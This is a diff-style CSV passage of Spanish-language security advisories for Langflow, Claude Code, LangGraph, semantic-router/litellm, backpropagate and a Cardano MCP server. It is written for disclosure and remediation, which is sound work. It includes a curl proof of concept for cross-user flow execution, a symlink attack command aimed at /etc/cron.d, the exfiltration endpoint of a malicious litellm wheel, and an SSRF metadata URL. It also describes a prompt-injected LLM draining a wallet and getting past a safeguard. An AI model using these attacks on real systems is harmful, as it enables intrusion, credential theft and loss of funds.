+El siguiente comando demuestra cómo un atacante (usuario A) puede ejecutar el flujo de una víctima (usuario B) conociendo únicamente su flow ID:
+
+```bash
+curl -X POST ""http://localhost:7860/api/v1/responses"" \
+  -H ""x-api-key: sk-ATTACKER_API_KEY"" \
+  -H ""Content-Type: application/json"" \
+  -d '{
+    ""model"": ""VICTIM_FLOW_ID"",
+    ""input_value"": ""test"",
+    ""stream"": false
+  }'
+# Devuelve 200 y ejecuta el flujo de la víctima
+```
+
+## Impacto
+
+Cualquier usuario autenticado en el sistema puede:
+
+1. Ejecutar cualquier flujo del sistema conociendo su flow ID.
+2. Acceder a datos potencialmente sensibles procesados por los flujos de la víctima.
+3. Consumir los recursos computacionales y de cuota de otros usuarios.
+
+El impacto es significativo en entornos multiusuario donde los flujos pueden contener lógica de negocio confidencial, credenciales embebidas o procesar información sensible.
+
+## Corrección aplicada
+
+La vulnerabilidad fue corregida en el PR #12832 (`fix(security): close IDOR in get_flow_by_id_or_endpoint_name`), fusionado el 22 de abril de 2026 y publicado en **Langflow 1.9.1**.
+
+La corrección normaliza el `user_id` una sola vez y aplica la verificación de propiedad en ambas ramas de búsqueda, tanto por UUID como por `endpoint_name`:
+
+```python
+flow_id = UUID(flow_id_or_name)
+flow = await session.get(Flow, flow_id)
+if flow is not None and uuid_user_id is not None and flow.user_id != uuid_user_id:
+    flow = None  # La búsqueda entre usuarios cae al 404 compartido
+```
+
+Puntos clave de la corrección:
+
+- Las búsquedas entre usuarios devuelven **404** (no 403), evitando así un oráculo de existencia de flujos basado en la diferencia entre respuestas 403 y 404.
+- Los endpoints `/api/v1/responses` y `/api/v2/workflow` pasan `user_id` de forma explícita, por lo que corregir la función auxiliar los cierra directamente. Las rutas `/api/v1/run*` fueron adicionalmente migradas desde una dependencia directa de `get_flow_by_id_or_endpoint_name` a dependencias con conciencia de autenticación, como medida de defensa en profundidad.
+- Un `user_id` malformado ahora falla de forma segura devolviendo 404 en lugar de un error 500 sin tratar.
+- Las rutas de webhook mantienen intencionalmente la búsqueda sin restricción de usuario, ya que son públicas por diseño y disponen de una verificación de propiedad explícita en otro punto.
+- Se han añadido pruebas de regresión que cubren el caso de UUID entre usuarios y reproducen el PoC original contra `/api/v1/responses`.
+
+## Recomendación
+
+Se recomienda actualizar a **Langflow 1.9.1** o superior a la mayor brevedad posible, especialmente en despliegues multiusuario o expuestos a redes no confiables.
+
+## Reconocimientos
+
+La vulnerabilidad fue divulgada de forma responsable por los investigadores de seguridad: @yzeirnials, @johnatzeropath, @LeftenantZero y @Zwique.","CRITICAL","9.9","3.1","CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L","Network","Low","Low","None","Changed","High","High","Low","CWE-639","Authorization Bypass Through User-Controlled Key","pip","langflow","< 1.9.1","1.9.1","Security","Security Advisory","Advisory","2026-06-19","2026-06-21T11:19:18.476Z","yzeirnials, andifilhohub, LeftenantZero, Zwique, AntonioABLima, erichare, Adam-Aghili","https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2;https://github.com/langflow-ai/langflow/pull/12832;https://github.com/advisories/GHSA-qrpv-q767-xqq2","XX","0","0","langflow"
+"GHSA-4vp2-6q8c-pvq2","CVE-2026-46406","archivo-temporal-inseguro-comando-copy-claude-code-permite","https://github.com/advisories/GHSA-4vp2-6q8c-pvq2","Archivo temporal inseguro en comando /copy de Claude Code permite lectura de respuestas y escritura arbitraria de archivos","El comando /copy de Claude Code escribía respuestas en una ruta predecible sin aislamiento ni protección contra symlinks, permitiendo a usuarios locales leer respuestas privilegiadas o sobrescribir archivos arbitrarios mediante un ataque de enlace simbólico.","## Archivo temporal inseguro en el comando /copy de Claude Code
+
+El comando `/copy` de `@anthropic-ai/claude-code` presentaba una vulnerabilidad de archivo temporal inseguro que exponía las respuestas generadas por el asistente y permitía la escritura arbitraria de archivos mediante ataques de enlace simbólico (symlink).
+
+## Descripción técnica
+
+El comando `/copy` escribía las respuestas en una ruta codificada de forma fija y completamente predecible:
+
+```bash
+/tmp/claude/response.md
+```
+
+Esta implementación carecía de los controles de seguridad mínimos exigibles en entornos multiusuario:
+
+- Sin aislamiento por UID del usuario que ejecuta el proceso.
+- Sin componente aleatorio en el nombre del archivo o del directorio.
+- Sin protección frente a la sustitución del archivo por un enlace simbólico.
+
+El archivo resultante se creaba con permisos de lectura universal (modo `0644`) dentro de un directorio igualmente accesible por cualquier usuario del sistema (modo `0755`). Esta combinación de factores abre dos vectores de ataque diferenciados.
+
+## Vector 1: Divulgación de respuestas privilegiadas
+
+Cualquier usuario local sin privilegios podía leer el contenido del archivo `/tmp/claude/response.md` en el momento en que un usuario privilegiado ejecutara el comando `/copy`. Dado que las respuestas de Claude Code pueden contener secretos, credenciales, tokens de API u otra información sensible, esta exposición representa un riesgo directo de fuga de información confidencial.
+
+## Vector 2: Escritura arbitraria de archivos mediante symlink
+
+Debido a que la ruta del archivo era estática y predecible, un atacante local podía anticiparse a la ejecución del comando `/copy` por parte de un usuario privilegiado. El flujo del ataque es el siguiente:
+
+1. El atacante crea previamente el directorio `/tmp/claude/` si no existe.
+2. El atacante planta un enlace simbólico en la ruta esperada, apuntando a un archivo arbitrario del sistema:
+
+```bash
+ln -s /etc/cron.d/backdoor /tmp/claude/response.md
+```
+
+3. Cuando el usuario privilegiado ejecuta `/copy`, el proceso sigue el enlace simbólico y escribe el contenido de la respuesta en el archivo elegido por el atacante.
+
+Este comportamiento puede derivar en escalada de privilegios, corrupción de archivos de configuración o ejecución de código arbitrario, dependiendo del archivo objetivo seleccionado por el atacante.
+
+## Condiciones de explotación
+
+La explotación de esta vulnerabilidad requiere que se cumplan simultáneamente las siguientes condiciones:
+
+- Un usuario local sin privilegios con acceso al mismo sistema.
+- Un usuario privilegiado que ejecute el comando `/copy` de Claude Code.
+
+No se requiere interacción de red ni acceso remoto. El ataque es completamente local.
+
+## Impacto
+
+Los impactos identificados son dos:
+
+- **Divulgación de información**: lectura no autorizada de respuestas que pueden contener credenciales, tokens o datos sensibles.
+- **Escritura arbitraria de archivos**: un proceso privilegiado puede ser manipulado para sobrescribir archivos del sistema elegidos por el atacante, lo que puede derivar en escalada de privilegios o compromiso del sistema.
+
+## Solución y recomendaciones
+
+Los usuarios que utilizan la actualización automática de Claude Code ya han recibido el parche correspondiente. Los usuarios que realizan actualizaciones manuales deben actualizar a la versión más reciente del paquete `@anthropic-ai/claude-code` a la mayor brevedad posible.
+
+Anthropics agradece a `hackerone.com/c_h4ck_0` el reporte responsable de esta vulnerabilidad.","MEDIUM","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-59","Improper Link Resolution Before File Access ('Link Following')","npm","@anthropic-ai/claude-code",">= 2.1.59, < 2.1.128","2.1.128","Security","Security Advisory","Advisory","2026-06-25","2026-06-25T20:25:15.244Z","","https://github.com/anthropics/claude-code/security/advisories/GHSA-4vp2-6q8c-pvq2;https://github.com/advisories/GHSA-4vp2-6q8c-pvq2","US","37.77","-122.42","Anthropic"
+"GHSA-fjqc-hq36-qh5p","CVE-2026-48775","deserializacion-json-insegura-carga-checkpoints-afecta-langgraph-jsonplusserializer","https://github.com/advisories/GHSA-fjqc-hq36-qh5p","Deserialización JSON insegura en carga de checkpoints afecta a LangGraph JsonPlusSerializer","LangGraph JsonPlusSerializer permite reconstruir objetos Python arbitrarios desde payloads JSON en el almacén de checkpoints. Si un actor no autorizado obtiene acceso de escritura al almacén, puede provocar ejecución de código arbitrario en el proceso worker de LangGraph, exponiendo secretos de runtime y sistemas accesibles desde él.","## Resumen
+
+El componente `JsonPlusSerializer` de LangGraph puede reconstruir objetos Python a partir de payloads JSON almacenados en el repositorio de checkpoints. Bajo condiciones en las que alguien pudiera modificar los bytes del checkpoint en reposo dentro del almacén de respaldo, la ruta de deserialización podría reconstruir objetos más allá de lo que la aplicación espera, lo que a su vez podría resultar en ejecución de código en el momento de carga del checkpoint.
+
+Esta es una cuestión de defensa en profundidad. El comportamiento afectado solo es alcanzable cuando los bytes del checkpoint en reposo en el almacén de respaldo pueden ser modificados por una parte no autorizada. En la mayoría de los despliegues, ese prerrequisito ya implica un incidente grave por sí mismo. La preocupación adicional es la escalada de ""acceso de escritura al almacén de checkpoints"" a ejecución de código en el runtime de la aplicación.
+
+No existe evidencia de que este comportamiento haya sido activado en entornos reales, y el equipo no tiene conocimiento de una ruta práctica hacia él en los despliegues actuales. Este cambio tiene como objetivo reducir la superficie de ataque disponible tras un incidente en el almacén de checkpoints.
+
+## Usuarios y sistemas afectados
+
+Los usuarios pueden verse afectados si cumplen todas las siguientes condiciones:
+
+- Utilizan un checkpointer persistente (base de datos, almacén remoto, sistema de archivos compartido, etc.) con el `JsonPlusSerializer` por defecto.
+- Cargan o reanudan desde checkpoints.
+- Operan en un entorno donde el acceso de escritura al almacén de checkpoints podría ser obtenido por una parte no autorizada.
+
+El serializador de checkpoints por defecto en todos los backends de checkpointer incluidos en la distribución (`PostgresSaver`, `SqliteSaver` y sus contrapartes asíncronas) es `JsonPlusSerializer`, por lo que las aplicaciones generalmente no necesitan configuración adicional para estar dentro del alcance de esta vulnerabilidad.
+
+## Impacto
+
+- Potencial ejecución de código arbitrario u otros efectos secundarios no seguros durante la deserialización de checkpoints.
+- Escalada desde ""acceso de escritura al almacén de checkpoints"" hasta ""ejecución de código en el proceso worker de LangGraph"", lo que puede exponer secretos de runtime o proporcionar acceso a otros sistemas alcanzables desde el runtime.
+
+## Parches y mitigación
+
+La ruta de deserialización JSON ha sido restringida de modo que la reconstrucción queda limitada a la reconstrucción mediante constructor por defecto, utilizando los args y kwargs contenidos en el payload. El codificador propio del framework no ha dependido del comportamiento eliminado para los checkpoints producidos desde la migración a msgpack, por lo que este cambio no afecta a los checkpoints escritos recientemente. Los payloads heredados que ya utilizaban el constructor por defecto como primera opción continúan reconstruyéndose correctamente a través de esa misma ruta.
+
+## Compatibilidad
+
+Existe una regresión de compatibilidad limitada en la reanudación de checkpoints anteriores a octubre de 2025 de modelos pydantic, en los que el payload original dependía de una fábrica de recuperación sin validación para recuperarse de una evolución de esquema incompatible. Tras este cambio, dichos payloads devuelven `None` desde la ruta de reconstrucción y pasan al revisor de langchain-core, que expone el diccionario raw en lugar de reconstruir el modelo.
+
+## Guía operacional
+
+- Tratar los almacenes de checkpoints como sensibles a la integridad. Restringir el acceso de escritura y rotar las credenciales si se sospecha acceso no autorizado.
+- Evitar proporcionar hooks de reconstrucción JSON personalizados que reconstruyan tipos arbitrarios, a menos que los datos del checkpoint sean completamente confiables.
+
+## Nota sobre LangSmith y despliegues hospedados
+
+El equipo no tiene conocimiento de que este problema represente una preocupación para los despliegues hospedados en LangSmith. Las condiciones descritas requieren la modificación de la capa de persistencia de checkpoints utilizada por el despliegue. Las configuraciones hospedadas típicas están diseñadas para prevenir dicho acceso.
+
+Reportado inicialmente por: pucagit (CyStack).","MEDIUM","6.8","3.1","CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H","Adjacent","Low","High","None","Unchanged","High","High","High","CWE-502","Deserialization of Untrusted Data","pip","langgraph-checkpoint","< 4.1.1","4.1.1","Security","Security Advisory","Advisory","2026-06-25","2026-06-25T20:58:12.986Z","pucagit","https://github.com/langchain-ai/langgraph/security/advisories/GHSA-fjqc-hq36-qh5p;https://nvd.nist.gov/vuln/detail/CVE-2026-48775;https://github.com/advisories/GHSA-fjqc-hq36-qh5p","US","37.77","-122.42","LangChain"
+"GHSA-98x5-vq43-vc5p","GHSA-98x5-vq43-vc5p","cve-2026-42208-dependencia-transitiva-limite-semanticrouter-expone-credenciales-via","https://github.com/advisories/GHSA-98x5-vq43-vc5p","CVE-2026-42208: dependencia transitiva sin límite en semantic-router expone credenciales vía litellm comprometido","semantic-router 0.1.8 a 0.1.14 declara litellm sin límite superior, permitiendo resolver litellm==1.82.8, una wheel maliciosa que exfiltra credenciales de nube, claves SSH, secretos CI/CD y carteras de criptomonedas al arrancar el intérprete Python. Corregido en semantic-router 0.1.15.","## Descripción general
+
+Las versiones 0.1.8 a 0.1.14 de semantic-router declaran la dependencia `litellm>=1.61.3` sin límite superior. Durante el período en que `litellm==1.82.8` fue la última versión disponible en PyPI, cualquier instalación nueva de una versión afectada de semantic-router podía resolver y descargar esa wheel comprometida.
+
+## Mecanismo de ataque
+
+La wheel maliciosa `litellm==1.82.8` incluye un archivo `litellm_init.pth` que se ejecuta automáticamente al arrancar el intérprete Python, sin necesidad de importar el paquete explícitamente. Una vez activado, el payload recopila y exfiltra la siguiente información del entorno comprometido:
+
+- Variables de entorno del proceso
+- Credenciales de AWS, GCP y Azure
+- Claves SSH, configuraciones de Kubernetes e historial de shell
+- Credenciales de bases de datos y secretos de pipelines CI/CD
+- Carteras de criptomonedas
+
+El payload de segunda etapa cifra los datos recopilados mediante AES-256 combinado con una clave pública RSA embebida, y los envía mediante una petición POST a:
+
+```
+https://models.litellm.cloud/
+```
+
+## Alcance real de la exposición
+
+El CVE-2026-42208 identifica específicamente la versión 1.82.8 como la comprometida. El resolvedor de pip selecciona la versión más reciente que satisfaga el rango declarado, por lo que el radio de impacto real en semantic-router corresponde a los usuarios que ejecutaron `pip install` durante la ventana temporal en que `litellm==1.82.8` estuvo publicada en PyPI, no a todos los que alguna vez instalaron las versiones 0.1.8 a 0.1.14. La alerta sigue siendo válida: una instalación afectada pudo haber descargado la wheel maliciosa, pero la explotación está acotada temporalmente.
+
+## Versiones afectadas
+
+- semantic-router 0.1.8 hasta 0.1.14 (inclusive)
+
+## Parche disponible
+
+El problema queda corregido en **semantic-router 0.1.15**, que eleva el límite inferior de la dependencia a `litellm>=1.83.7`, excluyendo así la versión comprometida del rango resoluble.
+
+## Mitigaciones alternativas
+
+Para los equipos que no puedan actualizar de forma inmediata, se recomiendan las siguientes acciones:
+
+**1. Fijar la versión de litellm explícitamente en el proyecto propio:**
+
+```bash
+pip install ""litellm>=1.83.7,!=1.82.8""
+```
+
+O declarar en `requirements.txt` o `pyproject.toml`:
+
+```
+litellm>=1.83.7,!=1.82.8
+```
+
+**2. Auditar el entorno en busca del archivo malicioso:**
+
+```bash
+find $(python -c ""import site; print(site.getsitepackages()[0])"") -name ""litellm_init.pth""
+```
+
+Si el archivo existe, eliminarlo de inmediato.
+
+**3. Rotar credenciales comprometidas:**
+
+Cualquier credencial accesible desde entornos donde se ejecutó una instalación afectada debe considerarse comprometida y rotarse sin demora. Esto incluye tokens de nube (AWS, GCP, Azure), claves SSH, secretos de CI/CD y credenciales de bases de datos.
+
+## Referencias
+
+- Reporte upstream: BerriAI/litellm issue #24512
+- Registro CVE: CVE-2026-42208
+
+## Créditos
+
+Reporte original y triaje realizados por los mantenedores de litellm. Véase el issue #24512 en el repositorio oficial de BerriAI/litellm.","CRITICAL","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-506","Embedded Malicious Code","pip","semantic-router",">= 0.1.8, < 0.1.15","0.1.15","Security","Security Advisory","Advisory","2026-06-26","2026-06-27T00:17:34.744Z","jamescalam","https://github.com/aurelio-labs/semantic-router/security/advisories/GHSA-98x5-vq43-vc5p;https://github.com/advisories/GHSA-98x5-vq43-vc5p","XX","0","0","semantic-router"
+"GHSA-f65r-h4g3-3h9h","CVE-2026-48797","bypass-autenticacion-backpropagate-expone-plano-control-entrenamiento-ia","https://github.com/advisories/GHSA-f65r-h4g3-3h9h","Bypass de autenticación en backpropagate expone plano de control de entrenamiento IA sin restricciones","En backpropagate >= 1.1.0, los flags --auth y --share de la UI Reflex no aplican autenticación real. El backend nunca lee la variable de entorno exportada, dejando expuestos datasets, modelos, rutas y push a HuggingFace Hub a cualquier cliente que alcance el puerto.","## Resumen
+
+En `backpropagate >= 1.1.0`, la interfaz web opcional basada en Reflex (instalable con `pip install backpropagate[ui]` y lanzada mediante `backprop ui`) expone un plano de control de entrenamiento completo: carga de datasets, carga de modelos, inicio y parada de entrenamientos, orquestación de múltiples ejecuciones, exportación GGUF y publicación en HuggingFace Hub.
+
+La CLI acepta dos flags orientados al operador, documentados como controles de seguridad:
+
+- `--auth user:pass`: documentado como ""requerir autenticación HTTP Basic en cada petición a la UI"".
+- `--share`: documentado como ""exponer la UI en una dirección pública; requiere `--auth`"".
+
+Cuando se pasa `--auth user:pass`, la CLI imprime `Auth: enabled (user: <username>)` para confirmar al operador que la autenticación está activa, y exporta `BACKPROPAGATE_UI_AUTH=user:pass` al subproceso que lanza el backend Reflex.
+
+**El backend Reflex (`backpropagate/ui_app/**`) nunca lee `BACKPROPAGATE_UI_AUTH`.** No se registra ningún middleware de autenticación. No se ejecuta ninguna guardia a nivel de petición. No se ejecuta ninguna guardia en la negociación de actualización WebSocket. Cualquier cliente que alcance el puerto vinculado, ya sea local o remoto según si se usa `--share`, tiene acceso completo a la UI.
+
+Un comentario inline en `backpropagate/cli.py:1217-1218` en el código fuente de v1.1.0 documenta la brecha: *""For Phase 1 the variable is exported but Reflex doesn't read it yet.""* Este comentario era de uso interno; la documentación orientada al usuario (README, CHANGELOG, SHIP_GATE) anunciaba el contrato como aplicado.
+
+Esta alerta se publica principalmente porque el comportamiento en tiempo de ejecución contradecía una afirmación de seguridad dirigida al operador. Los errores exclusivamente de código de forma comparable (verificación de autenticación completamente ausente en una ruta) ya justificarían la divulgación; la dimensión adicional de promesa falsa eleva la severidad.
+
+## Impacto
+
+Un atacante que alcance el puerto vinculado puede:
+
+- **Leer datasets cargados** renderizados en la vista previa de la UI, incluyendo el contenido de cualquier archivo JSONL, CSV o TXT que el operador legítimo haya subido para ajuste fino.
+- **Disparar ejecuciones de entrenamiento arbitrarias** contra cualquier modelo base que el operador tenga instalado localmente o que pueda descargarse desde HuggingFace.
+- **Disparar publicaciones en HuggingFace Hub** hacia repositorios especificados mediante la entrada de la UI (sujeto al alcance del token HF local del operador, típicamente todos los repositorios de su propiedad).
+- **Provocar un DoS por llenado de disco** a través del endpoint `rx.upload` (sin límite de tamaño, sin filtro de extensión, sin límite de conteo por sesión en v1.1.0 y v1.1.1).
+- **Leer rutas de modelos** (`source_model_path`, `dataset_path`, `model`, `uploaded_path`), que son proporcionadas por el usuario y eluden el helper `safe_path()` ubicado en `backpropagate/ui_security.py` (la validación de rutas es código muerto en la superficie Reflex en v1.1.0 y v1.1.1).
+
+La combinación de control de entrenamiento sin autenticación, suplantación del destino de publicación en HF y traversal mediante entradas de ruta hace que el endpoint afectado sea adecuado tanto para exfiltración de datos (lectura de datos de entrenamiento cargados) como para ataques a la cadena de suministro (publicación de pesos de modelo manipulados en la cuenta HF del operador).
+
+El comportamiento predeterminado de solo escucha local (sin `--share`) reduce la exposición a un atacante con acceso al host. El flag `--share` está documentado como una funcionalidad de ""URL pública""; los operadores que usaron `--share --auth user:pass` no recibieron ninguna advertencia de que la parte de autenticación era inerte.
+
+## Parches
+
+Corregido en **v1.2.0** (publicado el 2026-05-23). El parche implementa middleware ASGI real mediante `rx.App(api_transformer=basic_auth_transformer)` que protege las rutas HTTP y la negociación de actualización WebSocket `/_event`. Incluye cuatro modos (`no_auth_local_only`, `token_auto`, `explicit_creds` y `production`), cookie firmada con HMAC validada antes de `websocket.accept()`, y listas de permitidos para Host y Origin. El middleware se distribuye junto con una defensa en profundidad de 4 capas en las superficies cli.py, ui_app/app.py, rxconfig.py y eliminación de variables de entorno, de modo que las invocaciones directas con `python -m reflex run` (que eluden la guardia de la CLI) también aplican autenticación.
+
+Actualización mediante:
+
+```bash
+# pip
+pip install --upgrade backpropagate
+
+# npm
+npm install -g @mcptoolshop/backpropagate@latest
+```
+
+Notas de publicación completas: https://github.com/mcp-tool-shop-org/backpropagate/blob/main/CHANGELOG.md#120---2026-05-23
+
+## Mitigaciones
+
+Si los usuarios no pueden actualizar de inmediato:
+
+1. **No pasar `--auth` ni `--share` a `backprop ui`.** Ejecutar la UI sin flags (`backprop ui`); se vinculará a `localhost` y aceptará cualquier cliente que pueda alcanzar `127.0.0.1`.
+
+2. **Para acceso remoto, usar reenvío de puertos SSH** en lugar de `--share`:
+
+```bash
+# En el cliente:
+ssh -L 7860:localhost:7860 <training-host>
+
+# En el servidor:
+backprop ui            # sin --share
+# Luego abrir http://localhost:7860 en el navegador local.
+```
+
+SSH proporciona la capa de autenticación que la UI Reflex no implementaba.
+
+3. **Auditar despliegues existentes.** Si algún host ejecutando `backpropagate >= 1.1.0` fue lanzado previamente con `--share`, tratar cualquier dato de entrenamiento cargado, ruta de modelo o destino de publicación en HF visible en esa sesión de UI como potencialmente expuesto. Revocar y regenerar los tokens HF que hayan estado en uso durante dichas sesiones.
+
+**Brecha en la distribución binaria.** Los binarios independientes (Windows .exe y macOS .app mediante PyInstaller) no pudieron compilarse para v1.2.0 y se incluirán en una versión de parche posterior. Mientras tanto, los usuarios que dependían de la distribución binaria de v1.1.x deben instalar la versión parcheada mediante `pip install backpropagate==1.2.0` para recibir la corrección del bypass de autenticación. Tanto el paquete PyPI de v1.2.0 como el paquete npm `@mcptoolshop/backpropagate@1.2.0` incluyen el código parcheado.
+
+## Créditos
+
+Descubierto por la auditoría dogfood-swarm Stage A el 2026-05-22 (ID de hallazgo `FRONTEND-A-001`, clasificado como CRÍTICO). La auditoría también identificó documentación contradictoria en CHANGELOG, SHIP_GATE y README; estas inconsistencias fueron corregidas en v1.2.0 junto con la corrección en tiempo de ejecución.","CRITICAL","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-358","Improperly Implemented Security Check for Standard","pip","backpropagate",">= 1.1.0, < 1.2.0","1.2.0","Security","Security Advisory","Advisory","2026-06-26","2026-06-27T00:08:54.197Z","","https://github.com/mcp-tool-shop-org/backpropagate/security/advisories/GHSA-f65r-h4g3-3h9h;https://nvd.nist.gov/vuln/detail/CVE-2026-48797;https://github.com/mcp-tool-shop-org/backpropagate/releases/tag/v1.2.0;https://github.com/advisories/GHSA-f65r-h4g3-3h9h","XX","0","0","backpropagate"
+"GHSA-rp72-5v5q-2446","GHSA-rp72-5v5q-2446","ssrf-http-autenticacion-pagos-ilimitados-cardano402mcp-server-afectan-billeteras","https://github.com/advisories/GHSA-rp72-5v5q-2446","SSRF, HTTP sin autenticación y pagos ilimitados en @cardano402/mcp-server afectan billeteras Cardano","Tres vulnerabilidades críticas en @cardano402/mcp-server <= 0.1.1 permiten drenaje de billetera Cardano por ausencia de límites de gasto, transporte HTTP expuesto en LAN sin autenticación y SSRF mediante catalog.server.url. Corregido en 0.1.2.","## Resumen
+
+`@cardano402/mcp-server` en versiones `<= 0.1.1` presenta tres brechas de seguridad que pueden derivar en movimiento no autorizado de fondos cuando el paquete se utiliza según su diseño previsto: un servidor MCP que expone herramientas de pago Cardano a un agente de IA.
+
+## Impacto
+
+### 1. Ausencia de límites de gasto en pagos firmados
+
+Un LLM (o un LLM comprometido mediante inyección de prompt) que invoque las herramientas registradas por el servidor MCP puede llamarlas en bucle. Cada llamada firma una transacción Cardano real por el importe anunciado en el catálogo. No existe ningún tope por llamada, límite diario, paso de confirmación mediante elicitación MCP ni lista de destinatarios permitidos.
+
+La variable de entorno `MAINNET=true`, concebida como salvaguarda, puede ser eludida por cualquier LLM con acceso a herramientas de shell. En el peor caso, el resultado es el vaciado completo de la billetera.
+
+### 2. Transporte HTTP enlazado a 0.0.0.0 sin autenticación
+
+Al ejecutar `cardano402-mcp --transport http`, el servidor escucha en todas las interfaces de red sin lista de orígenes permitidos, sin requisito de token bearer y sin verificación CORS. Cualquier equipo en la misma LAN puede enviar una petición POST con `tools/call` de MCP y desencadenar pagos firmados desde la billetera del operador.
+
+### 3. SSRF mediante `catalog.server.url`
+
+Un catálogo malicioso puede declarar un campo `server.url` apuntando a infraestructura interna, por ejemplo:
+
+```
+http://169.254.169.254/latest/meta-data
+```
+
+La comprobación `allowInsecure` presente en la versión 0.1.1 solo valida la URL del catálogo en sí, no el valor de `server.url` que este devuelve. Adicionalmente, el campo `endpoint.path` no se normaliza, por lo que son funcionales tanto la traversal con `..` como el uso de URLs absolutas.
+
+## Parches
+
+Corregido en `@cardano402/mcp-server@0.1.2` con las siguientes medidas:
+
+- Límites de gasto por llamada y por día (5 ADA y 50 ADA por defecto), lista opcional de destinatarios permitidos y gancho de confirmación mediante `elicitation/create` de MCP.
+- El transporte HTTP enlaza por defecto a `127.0.0.1`. El uso en interfaces no loopback requiere `--http-bearer-token`. Se añade lista de orígenes permitidos por petición y verificación de token bearer.
+- `catalog.server.url` se valida contra reglas de CIDR privado (RFC1918, RFC4193, link-local, CGNAT, multicast, IPv6 mapeado a IPv4, loopback) salvo que se establezca `CARDANO402_ALLOW_INSECURE=true`.
+- `endpoint.path` es rechazado si contiene `..`, NUL, espacios en blanco o CRLF, una URL absoluta o la secuencia `//host/...`.
+- Habilitación de mainnet por herramienta individual mediante `--mainnet-confirmed-tools`.
+
+## Mitigaciones para usuarios de la versión 0.1.1
+
+Para quienes no puedan actualizar de inmediato, se recomiendan las siguientes medidas paliativas:
+
+- No ejecutar el servidor con `--transport http` en redes no confiables. Utilizar `--transport stdio` (opción por defecto).
+- Apuntar el servidor únicamente a catálogos propios o que hayan sido auditados previamente.
+- Emplear una billetera caliente con saldo reducido y nunca la billetera principal.
+- Evitar el uso de `MAINNET=true` hasta haber actualizado a la versión 0.1.2.","LOW","","3.1","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N","Network","Low","None","None","Unchanged","None","None","None","CWE-22","Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","npm","@cardano402/mcp-server","<= 0.1.1","0.1.2","Security","Security Advisory","Advisory","2026-06-26","2026-06-27T00:23:23.217Z","MorganOnCode","https://github.com/MorganOnCode/cardano402/security/advisories/GHSA-rp72-5v5q-2446;https://github.com/advisories/GHSA-rp72-5v5q-2446","XX","0","0","@cardano402/mcp-server"
